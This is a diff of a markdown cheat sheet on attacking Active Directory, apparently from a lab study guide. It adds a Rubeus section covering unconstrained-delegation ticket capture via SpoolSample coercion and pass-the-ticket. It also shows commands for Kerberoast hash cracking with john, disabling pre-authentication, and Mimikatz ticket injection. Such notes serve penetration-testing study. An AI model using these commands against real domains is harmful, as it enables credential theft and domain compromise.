@@ -555,11 +555,15 @@ OR Find-InterestingDomainAcl shows us all interesting ACLs modifiable by the cur
 
 ```john --wordlist /usr/share/wordlists/rockyou.txt --format=krb5tgs dump```
 
+* * * 
+
 #### Disabling Pre-Auth
 
 ```Set-DomainObject -Identity Control1User -XOR @{useraccountcontrol=4194304} –Verbose```
 
 ```Get-DomainUser -PreauthNotRequired -Verbose```
+
+* * * 
 
 # Privilege Escalation - Target a User via Kerberoasting Set-SPN
 
@@ -644,4 +648,14 @@ We can then reuse the DA token:
 
 ```
 Invoke-Mimikatz -Command '"kerberos::ptt C:\Users\appadmin\Documents\user1\[0;2ceb8b3]-2-0-60a10000-Administrator@krbtgt-DOLLARCORP.MONEYCORP.LOCAL.kirbi"'
+```
+#### Rubeus
+```Get-NetComputer -UnConstrained```
+
+```
+Rubeus triage
+Rubeus monitor /monitorinterval:1 /nowrap
+SpoolSample DC01 helpdesk.lab
+Rubeus ptt /ticket:
+klist
 ```
